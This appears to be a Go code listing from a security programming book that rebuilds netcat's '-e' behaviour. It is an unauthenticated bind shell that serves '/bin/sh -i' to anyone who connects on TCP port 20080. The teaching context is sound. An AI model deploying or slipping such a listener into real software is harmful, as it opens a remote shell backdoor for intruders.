// Pages 42-43
// Listing 2-12: Replicating Netcat's gaping security hole.
package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

// Flusher wraps bufio.Writer, explicitly flushing on all writes.
type Flusher struct {
	w *bufio.Writer
}

// NewFlusher creates a new Flusher from an io.Writer.
func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}
// Write writes bytes and explicitly flushes buffer.
func (foo *Flusher) Write(b []byte) (int, error) {
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}

	if err := foo.w.Flush(); err != nil {
		return -1, err
	}

	return count, err
}

func handle(conn net.Conn) {
	// Explicitly calling /bin/sh and using -i for interactive mode
	// so that we can use it for stdin and stdout.
	// For Windows use exec.Command("cmd.exe").
	cmd := exec.Command("/bin/sh", "-i")

	// Set stdin to our connection
	rp, wp := io.Pipe()
	cmd.Stdin = conn

	// Create a Flusher from the connection for stdout.
	// This ensures stdout is flushed adequately and sent via net.Conn.
	// Version 1
	// cmd.Stdout = NewFlusher(conn)

	// Version 2
	cmd.Stdout = wp // Assigns the writer to cmd.Stdout.
	go io.Copy(conn, rp) // Links the PipeReader to the TCP connection.

	// Run the command.
	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}
}

func main() {
	listener, err := net.Listen("tcp", ":20080")
	if err != nil {
		log.Fatalln(err)
	}

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln(err)
		}
		go handle(conn)
	}
}
